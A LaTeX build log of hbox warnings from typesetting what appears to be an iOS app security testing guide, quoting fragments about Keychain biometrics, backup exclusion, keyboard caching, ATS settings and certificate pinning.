Overfull \hbox (40.7994pt too wide) in paragraph at lines 35604--35604
[]    \TU/SourceCodePro(6)/m/n/10.95 return LAContext().canEvaluatePolicy(.devi
ceOwnerAuthentication, error: nil)[] 

Overfull \hbox (42.98941pt too wide) in paragraph at lines 35616--35616
[]  \TU/SourceCodePro(6)/m/n/10.95 if ([context canEvaluatePolicy:LAPolicyDevic
eOwnerAuthentication error:nil]) {[] 
[620] [621]
Underfull \hbox (badness 3536) in paragraph at lines 35726--35729
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrTokenIDSecureEnclave\TU/SourceSansPro(0)
/m/n/10.95 : this indicates that we want to use the Secure Enclave
[622] [623] [624]
Overfull \hbox (176.57944pt too wide) in paragraph at lines 35906--35906
[]\TU/SourceCodePro(6)/m/n/10.95 // Open the encrypted Realm file where getKey(
) is a method to obtain a key from the Keychain or a server[] 

Overfull \hbox (40.79945pt too wide) in paragraph at lines 35906--35906
[]  \TU/SourceCodePro(6)/m/n/10.95 // If the encryption key is wrong, []error[]
 will say that it[]s an invalid database[] 
[625]
Overfull \hbox (12.2613pt too wide) in paragraph at lines 35966--35969
[]\TU/SourceSansPro(0)/m/n/10.95 Navigate to the output directory and locate \T
U/SourceCodePro(6)/m/n/10.95 $APP_NAME.imazing\TU/SourceSansPro(0)/m/n/10.95 . 
Rename it to \TU/SourceCodePro(6)/m/n/10.95 $APP_NAME.zip\TU/SourceSansPro(0)/m
/n/10.95 . 
[626]
Underfull \hbox (badness 1762) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 an iOS device. With access to the source code an
d Xcode the app can be build and deployed

Underfull \hbox (badness 1769) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 in the iOS simulator. The file system of the cur
rent device of the iOS simulator is available in
[627] [628] [629]
Overfull \hbox (195.2431pt too wide) in paragraph at lines 36260--36264
\TU/SourceSansPro(0)/m/n/10.95 tion and spell checking. Most keyboard input is 
cached by default, in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Librar
y/Keyboard/dynamic-text.dat\TU/SourceSansPro(0)/m/n/10.95 . 
[630]
Underfull \hbox (badness 5119) in paragraph at lines 36274--36282
[]\TU/SourceCodePro(6)/m/n/10.95 var autocorrectionType: UITextAutocorrectionTy
pe \TU/SourceSansPro(0)/m/n/10.95 determines whether

Underfull \hbox (badness 2245) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 autocorrection is enabled during typing. When au
tocorrection is enabled, the text object

Underfull \hbox (badness 2547) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 tracks unknown words and suggests suitable repla
cements, replacing the typed text auto-

Underfull \hbox (badness 1515) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 matically unless the user overrides the replacem
ent. The default value of this property is

Overfull \hbox (15.45145pt too wide) in paragraph at lines 36311--36318
\TU/SourceSansPro(0)/m/n/10.95 Bars. For data that should be masked, such as PI
Ns and passwords, set \TU/SourceCodePro(6)/m/n/10.95 textObject.secureTextEntry

[631]
Overfull \hbox (71.45938pt too wide) in paragraph at lines 36378--36378
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /home/phanvanloc/.n
eedle/output/keyboard_autocomplete.txt[] 
[632] [633] [634] [635]
Underfull \hbox (badness 10000) in paragraph at lines 36610--36616
[]\TU/SourceSansPro(0)/m/n/10.95 Keychain items for which the \TU/SourceCodePro
(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Overfull \hbox (26.82729pt too wide) in paragraph at lines 36651--36658
\TU/SourceSansPro(0)/m/n/10.95 by default, you can [][]exclude files from the b
ackup[][] by calling \TU/SourceCodePro(6)/m/n/10.95 NSURL setResourceValue:forK
ey:error:
[636]
Overfull \hbox (14.51959pt too wide) in paragraph at lines 36692--36692
[]                                  \TU/SourceCodePro(6)/m/n/10.95 forKey: NSUR
LIsExcludedFromBackupKey error: &error];[] 

Overfull \hbox (47.36948pt too wide) in paragraph at lines 36692--36692
[]        \TU/SourceCodePro(6)/m/n/10.95 NSLog(@"Error excluding %@ from backup
 %@", [URL lastPathComponent], error);[] 

Overfull \hbox (23.27939pt too wide) in paragraph at lines 36722--36722
[]\TU/SourceCodePro(6)/m/n/10.95 func excludeFileFromBackup(filePath: URL) -> R
esult<Bool, ExcludeFileError> {[] 
[637]
Overfull \hbox (137.15941pt too wide) in paragraph at lines 36722--36722
[]        \TU/SourceCodePro(6)/m/n/10.95 return .failure(.error("Error excludin
g \(file.lastPathComponent) from backup \(error)"))[] 
[638]
Overfull \hbox (68.13258pt too wide) in paragraph at lines 36845--36847
\TU/SourceSansPro(0)/m/n/10.95 abled](Images/Chapters/0x06d/bither_demo_enable_
pin.PNG” 

Overfull \hbox (60.60991pt too wide) in paragraph at lines 36848--36851
\TU/SourceSansPro(0)/m/n/10.95 src=”Images/Chapters/0x06d/bither_demo_pin_scree
n.PNG){ 
[639]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/72b672220e785bc400e77500d5ace5fe63dd4db6.
png" > [640]
Underfull \hbox (badness 2951) in paragraph at lines 36900--36905
[]\TU/SourceSansPro(0)/m/n/10.95 The free workaround, however, is to find the p
list file in the obfuscated backup generated by

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/56de6a9d5ff0c19a00dc35b70da7bad221861447.
png" > [641]
Overfull \hbox (62.6994pt too wide) in paragraph at lines 36967--36967
[]    \TU/SourceCodePro(6)/m/n/10.95 UIImageView *myBanner = [[UIImageView allo
c] initWithImage:@"overlayImage.png"];[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 36982--36983
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/$APP_I
D/Library/Caches/Snapshots/ 

Overfull \hbox (430.61925pt too wide) in paragraph at lines 36999--36999
[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/B75DD942-76D1-4B86-8466-B79F7A
78B437@2x.png[] 
[642]
Overfull \hbox (502.88927pt too wide) in paragraph at lines 36999--36999
[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/downscaled/12B93BCB-610B-44DA-
A171-AF205BA71269@2x.png[] 
[643]
Overfull \hbox (32.03958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 var str1 = "Goodbye"              // "Goodbye"
, base address:            0x0001039e8dd0[] 

Overfull \hbox (27.65958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append(" ")                 // "Goodbye "
, base address:            0x608000064ae0[] 

Overfull \hbox (73.64944pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append("cruel world!")      // "Goodbye c
ruel world", base address: 0x6080000338a0[] 

Overfull \hbox (7.94965pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.removeAll()                 // "", base a
ddress                    0x00010bd66180[] 
[644] [645]
Underfull \hbox (badness 1354) in paragraph at lines 37222--37229
\TU/SourceSansPro(0)/m/n/10.95 (and any other r2frida specific commands) with a
 backslash \TU/SourceCodePro(6)/m/n/10.95 \ \TU/SourceSansPro(0)/m/n/10.95 afte
r starting the session with \TU/SourceCodePro(6)/m/n/10.95 r2
[646]
Underfull \hbox (badness 10000) in paragraph at lines 37297--37300
\TU/SourceSansPro(0)/m/n/10.95 sor - [][]$[][][][][] [] [] [] [][][] [] [][][][
][][][][] [] [][][] [] [][][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][]
 [][] [][] [][] [][][][][] [][] [][][][][][][][][][][][] [][] [][][] [][] [][][
][][][] [][]
[647]
Underfull \hbox (badness 3792) in paragraph at lines 37346--37348
[]\TU/SourceSansPro(0)/m/it/10.95 Symmetric-Key \TU/SourceSansPro(0)/m/n/10.95 
- Message Authentication Codes (HMAC) - Authenticated Encryption - AES-GCM -
[648] [649] [650]
Underfull \hbox (badness 5374) in paragraph at lines 37525--37534
[]\TU/SourceSansPro(0)/m/n/10.95 A lot has been said about deprecated algorithm
s and cryptographic configurations in section
[651]
Overfull \hbox (84.5994pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA1(password: String, salt: Data, 
keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (393.38934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA1), password: password, salt: salt, keyByteCount: keyByteCount, roun
ds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA256(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA256), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA512(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA512), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (211.61938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2(hash: CCPBKDFAlgorithm, password: 
String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivationStatus = derivedKeyData.with
UnsafeMutableBytes { derivedKeyBytes in[] 
[652]
Overfull \hbox (202.85939pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivedKey = pbkdf2SHA1(password: pass
word, salt: salt, keyByteCount: keyByteCount, rounds: rounds)[] 
[653] [654] [655]
Underfull \hbox (badness 3724) in paragraph at lines 37869--37872
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on Security - []
[]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[][][][][][][][] []

Overfull \hbox (14.51588pt too wide) in paragraph at lines 37883--37886
[]\TU/SourceSansPro(0)/m/n/10.95 Apple’s Cryptographic Services Guide - [][]$[]
[][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] 
[] [][][][][][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3078) in paragraph at lines 37886--37889
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 SecKey - [][]$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 37892--37895
[]\TU/SourceSansPro(0)/m/n/10.95 Source code of the header file - [][]$[][][][]
[] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][][][][][][][][] []

Overfull \hbox (0.48085pt too wide) in paragraph at lines 37895--37898
[]\TU/SourceSansPro(0)/m/n/10.95 GCM in CommonCrypto - [][]$[][][][][] [] [] []
 [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][][][][][][]
[][][][][] [] [][][][][][][][][][][][] [][]

Underfull \hbox (badness 1803) in paragraph at lines 37898--37901
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on SecKey - [][]
$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[] [] [][][][][][][][] []
[656]
Underfull \hbox (badness 10000) in paragraph at lines 37923--37926
[]\TU/SourceSansPro(0)/m/n/10.95 Google on Tink - [][]$[][][][][] [] [] [] [][]
[][][][][][] [] [][][][][][][][][][] [] [][][] [] [][][][] [] [][] [] [][][][][
][][][][][][] [][] [][][][] [][] [][][][][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 37928--37931
[]\TU/SourceSansPro(0)/m/n/10.95 cartfile - [][]$[][][][][] [] [] [] [][][][][]
[] [] [][][] [] [][][][][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][
] [] [][][][][][][][][][][][][] [] [][][][][][][][][] [] [][] []

Overfull \hbox (3.03296pt too wide) in paragraph at lines 37941--37944
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][
][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37944--37947
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on secrandomcopy
bytes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37957--37960
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Certificates an
d keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []


Underfull \hbox (badness 10000) in paragraph at lines 37960--37963
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Generating new 
keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Overfull \hbox (9.98613pt too wide) in paragraph at lines 37960--37963
[][][][][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][][] [] [][
][] [] [][][] [] [][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][][][]
[][] [] [][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3884) in paragraph at lines 37963--37965
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Key generation 
attributes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][
] []
[657]
Underfull \hbox (badness 4013) in paragraph at lines 38021--38032
[]\TU/SourceCodePro(6)/m/n/10.95 Security.framework \TU/SourceSansPro(0)/m/n/10
.95 is a lower level API to access [][]keychain services[][]. This is a se-

Underfull \hbox (badness 2644) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 cure option if your app needs to protect some se
cret data with biometric authentication,

Underfull \hbox (badness 4518) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 since the access control is managed on a system-
level and can not easily be bypassed.

Overfull \hbox (34.8901pt too wide) in paragraph at lines 38034--38040
[]\TU/SourceSansPro(0)/m/n/10.95 Please be aware that using either the \TU/Sour
ceCodePro(6)/m/n/10.95 LocalAuthentication.framework \TU/SourceSansPro(0)/m/n/1
0.95 or the \TU/SourceCodePro(6)/m/n/10.95 Security.framework\TU/SourceSansPro(
0)/m/n/10.95 ,
[658]
Overfull \hbox (29.56102pt too wide) in paragraph at lines 38054--38060
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthentication\TU/SourceSansPro(0)/
m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDeviceOwnerAuthenti
cation\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (214.98097pt too wide) in paragraph at lines 38060--38064
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthenticationWithBiometrics \TU/So
urceSansPro(0)/m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDevi
ceOwnerAuthenticationWithBiometrics\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (51.74937pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 guard context.canEvaluatePolicy(.deviceOwnerAu
thentication, error: &error) else {[] 

Overfull \hbox (82.40948pt too wide) in paragraph at lines 38090--38090
[]    \TU/SourceCodePro(6)/m/n/10.95 // Could not evaluate policy; look at erro
r and present an appropriate message to user[] 

Overfull \hbox (463.46931pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 context.evaluatePolicy(.deviceOwnerAuthenticat
ion, localizedReason: "Please, pass authorization to enter this area") { succes
s, evaluationError in[] 

Overfull \hbox (156.86946pt too wide) in paragraph at lines 38090--38090
[]        \TU/SourceCodePro(6)/m/n/10.95 // User did not authenticate successfu
lly, look at evaluationError and take appropriate action[] 
[659]
Overfull \hbox (126.31892pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 be accessed only on the current device while the
 passcode is set (\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPasscode
SetThisDeviceOnly

Overfull \hbox (206.75691pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 parameter) and after Touch ID authentication for
 the currently enrolled fingers only (\TU/SourceCodePro(6)/m/n/10.95 SecAccessC
ontrolCreateFlags.biometryCurrentSet

Overfull \hbox (16.70944pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that will re
present authentication settings[] 

Overfull \hbox (34.22939pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 guard let accessControl = SecAccessControlCrea
teWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (99.9297pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,[] 

Overfull \hbox (93.3597pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 SecAccessControlCreateFlags.biometryCurrentSet,[] 

Overfull \hbox (378.0594pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay atte
ntion that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible 
attribute[] 

Overfull \hbox (73.64941pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecValueData as String] = "test_strong_
password".data(using: .utf8)! as CFData[] 
[660]
Overfull \hbox (34.22946pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that wil
l represent authentication settings[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlRef sacRef = SecAccessCont
rolCreateWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (395.57942pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay 
attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessi
ble attribute[] 

Overfull \hbox (170.00938pt too wide) in paragraph at lines 38185--38185
[]        \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecValueData: [@"test_st
rong_password" dataUsingEncoding:NSUTF8StringEncoding],[] 
[661]
Overfull \hbox (167.81941pt too wide) in paragraph at lines 38215--38215
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecUseOperationPrompt as String] = "Ple
ase, pass authorisation to enter this area" as CFString[] 

Overfull \hbox (82.40938pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 NSDictionary *query = @{(__bridge id)kSecClass
: (__bridge id)kSecClassGenericPassword,[] 

Overfull \hbox (106.49944pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecUseOperationPrompt: @"Ple
ase, pass authorisation to enter this area" };[] 
[662]
Overfull \hbox (78.02939pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 OSStatus status = SecItemCopyMatching((__bridg
e CFDictionaryRef)query, &queryResult);[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString* password = [[NSString alloc] ini
tWithData:resultData encoding:NSUTF8StringEncoding];[] 

Overfull \hbox (29.8494pt too wide) in paragraph at lines 38257--38257
[]\TU/SourceCodePro(6)/m/n/10.95 /System/Library/Frameworks/LocalAuthentication
.framework/LocalAuthentication[] 
[663]
Overfull \hbox (110.23622pt too wide) in paragraph at lines 38287--38296
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrentSet \TU/Source
SansPro(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccess
ControlTouchIDCurrentSet\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (18.25624pt too wide) in paragraph at lines 38296--38306
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro
(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControl
TouchIDAny\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (153.38371pt too wide) in paragraph at lines 38315--38321
[]\TU/SourceSansPro(0)/m/n/10.95 In order to make sure that biometrics can be u
sed, verify that the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPassc
odeSetThisDeviceOnly

Underfull \hbox (badness 10000) in paragraph at lines 38315--38321
\TU/SourceSansPro(0)/m/n/10.95 or the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAc
cessibleWhenPasscodeSet \TU/SourceSansPro(0)/m/n/10.95 protection class is set 
when the

Overfull \hbox (13.90015pt too wide) in paragraph at lines 38315--38321
\TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateWithFlags \TU/SourceSansPr
o(0)/m/n/10.95 method is called. Note that the \TU/SourceCodePro(6)/m/n/10.95 .
..ThisDeviceOnly
[664] [665]
Underfull \hbox (badness 1303) in paragraph at lines 38428--38437
[]\TU/SourceSansPro(0)/m/n/10.95 Most modern mobile apps use variants of HTTP-b
ased web services, as these protocols are well-
[666]
Overfull \hbox (63.0455pt too wide) in paragraph at lines 38545--38548
[]\TU/SourceSansPro(0)/m/n/10.95 ATS restrictions can be disabled by configurin
g exceptions in the Info.plist file under the \TU/SourceCodePro(6)/m/n/10.95 NS
AppTransportSecurity
[667]
Overfull \hbox (865.62978pt too wide) in paragraph at lines 38561--38567
\TU/SourceSansPro(0)/m/n/10.95 ture of the \TU/SourceCodePro(6)/m/n/10.95 [NSAp
pTransportSecurity](https://developer.apple.com/library/content/documentation/G
eneral/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/
plist/info/NSAppTransportSecurity

Overfull \hbox (16.7095pt too wide) in paragraph at lines 38584--38584
[]            \TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy 
: Boolean   // Default value is YES[] 

Overfull \hbox (13.08879pt too wide) in paragraph at lines 38605--38606
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoads|  

Overfull \hbox (91.92879pt too wide) in paragraph at lines 38611--38612
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent|  

Overfull \hbox (19.6588pt too wide) in paragraph at lines 38617--38618
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsLocalNetworking|  

Overfull \hbox (65.64879pt too wide) in paragraph at lines 38622--38623
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsForMedia|  
[668]
Overfull \hbox (91.92879pt too wide) in paragraph at lines 38651--38652
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionAllowsInsecureHTTPLoads|  

Overfull \hbox (52.50879pt too wide) in paragraph at lines 38657--38658
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionMinimumTLSVersion|  

Overfull \hbox (85.35878pt too wide) in paragraph at lines 38662--38663
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy|  
[669]
Overfull \hbox (161.24939pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Configuring ATS Info.plist keys and displaying
 the result of HTTPS loads to https://www.example.com.[] 

Overfull \hbox (36.41942pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 A test will "PASS" if URLSession:task:didCompl
eteWithError: returns a nil error.[] 

Overfull \hbox (318.92938pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Use []--verbose[] to view the ATS dictionaries
 used and to display the error received in URLSession:task:didCompleteWithError
:.[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 
[670]
Overfull \hbox (327.68933pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 2019-01-15 09:39:27.892 nscurl[11459:5126999] 
NSURLSession/NSURLConnection HTTP load failed (kCFStreamErrorDomainSSL, -9800)[
] 
[671]
Underfull \hbox (badness 4024) in paragraph at lines 38830--38833
[]\TU/SourceSansPro(0)/m/n/10.95 If the application opens third party web sites
 in web views, then from iOS 10 onwards

Underfull \hbox (badness 3209) in paragraph at lines 38830--38833
\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent \TU/SourceSan
sPro(0)/m/n/10.95 can be used to disable ATS restrictions for
[672]
Overfull \hbox (82.38867pt too wide) in paragraph at lines 38918--38924
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 connection: f
orAuthenticationChallenge\TU/SourceSansPro(0)/m/n/10.95 . Within \TU/SourceCode
Pro(6)/m/n/10.95 connection: forAuthenticationChallenge\TU/SourceSansPro(0)/m/n
/10.95 ,

Overfull \hbox (378.0593pt too wide) in paragraph at lines 38941--38941
[]\TU/SourceCodePro(6)/m/n/10.95 (void)connection:(NSURLConnection *)connection
 willSendRequestForAuthenticationChallenge:(NSURLAuthenticationChallenge *)chal
lenge[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 SecCertificateRef certificate = SecTrustGetC
ertificateAtIndex(serverTrust, 0);[] 

Overfull \hbox (104.30937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData *remoteCertificateData = CFBridgingRe
lease(SecCertificateCopyData(certificate));[] 

Overfull \hbox (156.86937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSString *cerPath = [[NSBundle mainBundle] p
athForResource:@"MyLocalCertificate" ofType:@"cer"];[] 

Overfull \hbox (233.51941pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 The control below can verify if the certific
ate received by the server is matching the one pinned in the client.[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSURLCredential *credential = [NSURLCredenti
al credentialForTrust:serverTrust];[] 

Overfull \hbox (78.02939pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 [[challenge sender] useCredential:credential
 forAuthenticationChallenge:challenge];[] 
[673]
Overfull \hbox (56.34846pt too wide) in paragraph at lines 38952--38957
[]\TU/SourceSansPro(0)/m/n/10.95 Implement your own pin based on the public key
: Change the comparison \TU/SourceCodePro(6)/m/n/10.95 if ([remoteCertificateDa
ta
[674] [675]
Underfull \hbox (badness 10000) in paragraph at lines 39161--39163
[][][][][][][][] [][] [][][][][] [][] [][][][][][][][][][][][][][][][][][][][][
][] [][] [][][][][][][][][][][][][][][][][][][][][][] [][] [][][] [][] [][][][]
[][][][][] [][] [][][][][][][][] [][] [][][] [][]
[676] [677] [678]
Overfull \hbox (46.84747pt too wide) in paragraph at lines 39334--39339
[]\TU/SourceSansPro(0)/m/n/10.95 App capabilities like \TU/SourceCodePro(6)/m/n
/10.95 bluetooth-peripheral \TU/SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro
(6)/m/n/10.95 bluetooth-central \TU/SourceSansPro(0)/m/n/10.95 (both \TU/Source
CodePro(6)/m/n/10.95 UIBackgroundModes\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (164.22061pt too wide) in paragraph at lines 39341--39346
[]\TU/SourceSansPro(0)/m/n/10.95 However, this is not yet enough for the app to
 get access to the Bluetooth peripheral, the \TU/SourceCodePro(6)/m/n/10.95 NSB
luetoothPeripheralUsageDescription
[679]
Overfull \hbox (53.38101pt too wide) in paragraph at lines 39418--39421
[]\TU/SourceSansPro(0)/m/n/10.95 The provisioning profile is embedded into the 
app bundle during the build (\TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprov
ision\TU/SourceSansPro(0)/m/n/10.95 ). 

Underfull \hbox (badness 1655) in paragraph at lines 39425--39432
[]\TU/SourceSansPro(0)/m/n/10.95 For example, if you want to set the “Default D
ata Protection” capability, you would need to go

Overfull \hbox (2.72989pt too wide) in paragraph at lines 39425--39432
